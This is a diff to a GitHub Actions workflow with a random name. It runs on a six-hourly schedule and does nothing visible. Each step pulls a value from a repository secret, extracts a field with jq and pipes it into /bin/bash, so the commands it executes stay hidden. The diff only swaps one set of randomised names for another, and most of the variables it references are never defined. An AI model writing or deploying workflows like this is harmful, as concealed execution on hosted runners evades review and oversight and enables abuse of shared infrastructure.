@@ -2,25 +2,22 @@ name: interjectwet
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 5/6 * * *'
+    - cron: '16 1/6 * * *'
 
-jobs:  # 14701
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: interjectwet
         env:
-          cagfz05: ${{ secrets.cagfz05 }}
+          lg22: ${{ secrets.lg22 }}
         run: |
-          echo $cagfz05 | jq -r .dctvt0 | /bin/bash
-          echo $qtmu5 | jq -r .kytyz06 | /bin/bash
-          echo $ky9144 | jq -r .w7 | /bin/bash
-          echo $uni704 | jq -r .pzsis6954 | /bin/bash
-          echo $ctqgs5102 | jq -r .oxnwe31 | /bin/bash
-          echo $uu2 | jq -r .i4585 | /bin/bash
-          echo $yx14019 | jq -r .u4 | /bin/bash
-          echo $ljvx873 | jq -r .pewkc320 | /bin/bash
-          echo $enbtg956 | jq -r .ww0 | /bin/bash
+          echo $lg22 | jq -r .pnx9 | /bin/bash
+          echo $baj24 | jq -r .fud4575 | /bin/bash
+          echo $kfewd7 | jq -r .is151 | /bin/bash
+          echo $jiqvv942 | jq -r .fbyzs8313 | /bin/bash
+          echo $ud8918 | jq -r .nczp44920 | /bin/bash
+          echo $dqr749 | jq -r .kiue9590 | /bin/bash
+          echo $namol42 | jq -r .azu1 | /bin/bash
 
